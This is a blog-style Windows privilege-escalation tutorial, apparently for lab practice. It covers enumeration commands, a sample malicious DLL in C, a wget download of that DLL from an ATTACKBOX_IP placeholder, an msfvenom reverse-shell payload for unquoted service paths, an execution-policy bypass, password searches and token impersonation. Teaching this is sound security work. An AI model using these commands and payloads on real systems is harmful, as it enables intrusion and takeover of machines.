# Windows PrivEsc

> Shahrukh Tramboo | February 10th, 2022

--------------------------------------

**Introduction**

Windows systems have different user privilege levels.
Some user levels you will most commonly see are listed below:

1.	Administrator (local): This is the user with the most privileges.
2.	Standard (local): These users can access the computer but can only perform limited tasks. Typically these users can not make permanent or essential changes to the system. 
3.	Guest: This account gives access to the system but is not defined as a user. 
4.	Standard (domain): Active Directory allows organizations to manage user accounts. A standard domain account may have local administrator privileges. 
5.	Administrator (domain): Could be considered as the most privileged user. It can edit, create, and delete other users throughout the organization's domain. 

You may see some sources refer to "SYSTEM" as a privileged account. It is worth noting that "SYSTEM" is not an account in the proper sense. Windows and its services use the "SYSTEM" account to perform their tasks.

Services installed on a Windows target system can use service accounts and will have a certain level of privilege, depending on the service using them. Service accounts do not allow you to log in but can be leveraged in other ways for privilege escalation.

Any user can be a member of the "Administrator" group, giving it administrator rights on the system. 

-----------------------------------------

**Methodology**

1.	Enumerate the current user's privileges and resources it can access.
2.	If the antivirus software allows it, run an automated enumeration script such as winPEAS or PowerUp.ps1
3.	If the initial enumeration and scripts do not uncover an obvious strategy, try a different approach
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

-------------------------------------------

**Information Gathering**

User Enumeration:
The following commands will help us enumerate users and their privileges on the target system.

Current user’s privileges:
```bash
whoami /priv
```

List users: 
```bash
net users
```

List details of a user: 
```bash
net user username
```

Other users logged in simultaneously: 
```bash
qwinsta
```

User groups defined on the system:
```bash
net localgroup
```

List members of a specific group:
```bash
net localgroup groupname
```

-----------------------------------------------

**Collecting system information**

The systeminfo  command will return an overview of the target system.

```bash
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

In a corporate environment, the computer name can also provide some idea about what the system is used for or who the user is. 
The 
```bash
hostname 
```
command can be used for this purpose

----------------------------------------------

**Searching files**

Configuration files of software installed on the target system can sometimes provide us with cleartext passwords. 

```bash
findstr /si password *.txt
```

Command breakdown:

findstr: Searches for patterns of text in files.

/si: Searches the current directory and all subdirectories (s), ignores upper case / lower case differences (i)

password: The command will search for the string “password” in files

*.txt: The search will cover files that have a .txt extension


-----------------------------------------------

**Patch level**

 The command below can be used to list updates installed on the target system.

 ```bash
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 ```

 WMIC is a command-line tool on Windows that provides an interface for Windows Management Instrumentation (WMI).

 WMIC is deprecated in Windows 10, version 21H1 and the 21H1 semi-annual channel release of Windows Server. For newer Windows versions you will need to use the WMI PowerShell cmdlet.

 --------------------------------------------------

 **Network Connections**

 The netstat command can be used to list all listening ports on the target system. 

 ```bash
 netstat -ano
 ```
The command above can be broken down as follows;

-a: Displays all active connections and listening ports on the target system.
-n: Prevents name resolution. IP Addresses and ports are displayed with numbers instead of attempting to resolves names using DNS.
-o: Displays the process ID using each listed connection.

----------------------------------------------------

**Scheduled Tasks**
The schtasks command can be used to query scheduled tasks.

```bash
schtasks /query /fo LIST /v
```

----------------------------------------------------

**Drivers**

The 
```bash
driverquery 
```
command will list drivers installed on the target system.

-----------------------------------------------------

**Antivirus**

Typically, you can take two approaches: looking for the antivirus specifically or listing all running services and checking which ones may belong to antivirus software.

the default antivirus installed on Windows systems, Windows Defender’s service name is windefend. 

```bash
sc query windefend
```

While the second approach will allow you to detect antivirus software without prior knowledge about its service name, the output may be overwhelming.

```bash
sc queryex type=service
```

----------------------------------------------------------

**Tools of the trade**

1.	WinPEAS:
WinPEAS will run commands similar to the ones listed in the previous task and print their output. 

2.	PowerUp:
PowerUp is a PowerShell script that searches common privilege escalation on the target system.
You can run it with the
```bash
Invoke-AllChecks
```
option that will perform all possible checks on the target system or use it to conduct specific checks

e.g. the 
```bash
Get-UnquotedService
``` 
option to only look for potential unquoted service path vulnerabilities

Reminder:
To run PowerUp on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can launch PowerShell using the command below.

```bash
powershell.exe -nop -exec bypass
```
3.	Windows Exploit Suggester

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use Windows Exploit Suggester, which will run on your attacking machine

Windows Exploit Suggester is a Python script

type the 
```bash
windows-exploit-suggester.py –update 
```
command to update the database. 

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

```bash
windows-exploit-suggester.py --database 2021-09-21-mssb.xls --systeminfo sysinfo_output.txt
```

4.	Metasploit

If you already have a Meterpreter shell on the target system

```bash
use multi/recon/local_exploit_suggester
```
module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.

----------------------------------------------------------------

**Vulnerable Software**

You can use the wmic tool seen previously to list software installed on the target system and its versions. 

```bash
wmic product get name,version,vendor
```

Be careful; due to some backward compatibility issues (e.g. software written for 32 bits systems running on 64 bits), the wmic product command may not return all installed programs.

Therefore, It is worth checking running services using the command below to have a better understanding of the target system.

```bash
wmic service list brief | findstr  "Running"
```

```bash
wmic service get name,displayname,pathname,startmode
```

If you need more information on any service, you can simply use the 
```bash
sc qc
```

-------------------------------------------------------------

**DLL Hijacking**

A DLL Hijacking scenario consists of replacing a legitimate DLL file with a malicious DLL file that will be called by the executable and run.

Manipulating DLL files could mean replacing an existing file or creating a file in the location where the application is looking for it.

At this point, we will look to the DLL search order.

Microsoft has a document on the subject located here.
https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order

In summary, for standard desktop applications, Windows will follow one of the orders listed below depending on if the SafeDllSearchMode is enabled or not.

If SafeDllSearchMode is enabled, the search order is as follows:

1.	The directory from which the application loaded.

2.	The system directory. Use the 
```bash
GetSystemDirectory 
```
function to get the path of this directory.

3.	The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.

4.	The Windows directory. Use the 
```bash
GetWindowsDirectory 
```
function to get the path of this directory.

5.	The current directory.

6.	The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

If SafeDllSearchMode is disabled, the search order is as follows:

1.	The directory from which the application loaded.

2.	The current directory.

3.	The system directory. Use the GetSystemDirectory function to get the path of this directory.

4.	The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched.

5.	The Windows directory. Use the GetWindowsDirectory function to get the path of this directory.

6.	The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the App Paths registry key. The App Paths key is not used when computing the DLL search path.

---------------------------------------------------------

**Finding DLL Hijacking Vulnerabilities**

The tool you can use to find potential DLL hijacking vulnerabilities is Process Monitor (ProcMon). 

---------------------------------------------------------

**Creating the malicious DLL file**

```bash
#include <windows.h>

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k whoami > C:\\Temp\\dll.txt");
        ExitProcess(0);
    }
    return TRUE;
}
```

The mingw compiler can be used to generate the DLL file with the command given below:

```bash
x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
```

install it by
```bash
sudo apt install gcc-mingw-w64-x86-64
```

You can use the following PowerShell command to download the .dll file to the target system:
```bash
wget -O hijackme.dll ATTACKBOX_IP:PORT/hijackme.dll
```

We will have to stop and start the dllsvc service again using the command below:
```bash
sc stop dllsvc & sc start dllsvc
```
-----------------------------------------------------

**Unquoted Service Path**

```bash
sc qc netlogon
```

In the example above, when the service is launched, Windows follows a search order similar to what we have seen in the previous task. Imagine now we have a service (e.g. srvc) which has a binary path set to C:\Program Files\topservice folder\subservice subfolder\srvc.exe

To the human eye, this path would be merely different than "C:\Program Files\topservice folder\subservice subfolder\srvc.exe".

Windows approaches the matter slightly differently.

However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path.


In our example, this would be C:\Program.exe. If program.exe is not available, the second attempt will be to run topservice.exe under C:\Program Files\.

----------------------------------------------------------

**Finding Unquoted Service Path Vulnerabilities**

Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1.  Being able to write to a folder on the path
2.  Being able to restart the service

```bash
wmic service get name,displayname,pathname,startmode
```

Once we have located this service, we will have to make sure other conditions to exploit this vulnerability are met.

You can further check the binary path of this service using the command below: 

```bash
sc qc unquotedsvc
```

Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.

```bash
.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
```
The output will list user groups with read (R) and write (W) privileges on the "Program Files" folder.

Generate payload using msfvenom
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe
```

Once you have generated and moved the file to the correct location on the target machine, you will need to restart the vulnerable service.

```bash
sc start unquotedsvc
```

--------------------------------------------------------------

**Tokens**

Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions.
Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe

This access token consists of:

1.  user SIDs(security identifier)
2.  group SIDs
3.  privileges

There are two types of access tokens:
1.  primary access tokens: those associated with a user account that are generated on log on
2.  impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process

The privileges of an account allow a user to carry out particular actions. Here are the most commonly abused privileges:
1.  SeImpersonatePrivilege
2.  SeAssignPrimaryPrivilege
3.  SeTcbPrivilege
4.  SeBackupPrivilege
5.  SeRestorePrivilege
6.  SeCreateTokenPrivilege
7.  SeLoadDriverPrivilege
8.  SeTakeOwnershipPrivilege
9.  SeDebugPrivilege

View all the privileges using whoami /priv
```bash
whoami /priv
```

You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. 
```bash
load incognito
```

To check which tokens are available, enter the 
```bash
list_tokens -g
```

We can see that the BUILTIN\Administrators token is available.

```bash
impersonate_token "BUILTIN\Administrators" 
```

Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions

The safest process to pick is the services.exe process.


or 

https://github.com/dievus/printspoofer/raw/master/PrintSpoofer.exe

https://github.com/itm4n/PrintSpoofer

